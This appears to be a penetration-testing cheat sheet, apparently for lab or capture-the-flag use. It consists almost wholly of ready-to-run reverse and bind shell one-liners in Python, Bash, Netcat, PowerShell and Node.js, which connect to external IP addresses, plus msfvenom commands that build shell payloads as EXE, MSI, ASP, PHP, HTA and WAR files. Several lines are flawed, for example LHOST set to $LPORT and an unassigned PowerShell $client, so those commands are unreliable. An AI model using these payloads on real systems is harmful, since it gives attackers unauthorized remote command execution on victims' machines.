# Shells / Payloads

**Python Bind Shell**

```
python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",443));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

**Python Reverse Shell**

```
export RHOST="10.10.10.10"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

**Bash Reverse Shells**

```
/bin/bash -i >& /dev/tcp/10.0.0.1/443 0>&1
```

## **Msfvenom Reverse Shells**

#### **Staged Payloads for Windows - x86**

```
msfvenom -p windows/shell/reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x86.exe
```

#### **Staged Payloads for Windows - x64**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x64.exe
```

#### **Stageless Payloads for Windows - x86**&#x20;

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x86.exe
```

#### **Stageless Payloads for Windows - x64**&#x20;

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALIIP LPORT=$KALIPORT -f exe > shell-x64.exe
```

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$TARGET LPORT=$PORT -f elf -o rshell.elf
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f asp -o rshell.asp
```

```
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o rshell.php
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=$LPORT LPORT=$LPORT -f hta-psh -o rshell.hta
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f powershell
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o rshell.msi
```

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LPORT LPORT=$LPORT -f war > rshell.war
```

#### **Netcat Reverse Shells**

```
sudo nc -nv 10.10.10.10 443 -e /bin/bash
```

```
nc -nv 10.10.10.10 443 -e "/bin/bash"
```

#### **PowerShell Reverse Shell**

```
'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.11.12.13",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

#### **JavaScript Reverse Shell**

```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(4444, "192.168.69.123", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

#### **Upgrade to a PTY Shell**

```
echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
python /tmp/shell.py
export TERM=xterm # be able to clear the screen, etc.
```

#### HTA

[https://tryhackme.com/room/weaponization](https://tryhackme.com/room/weaponization)

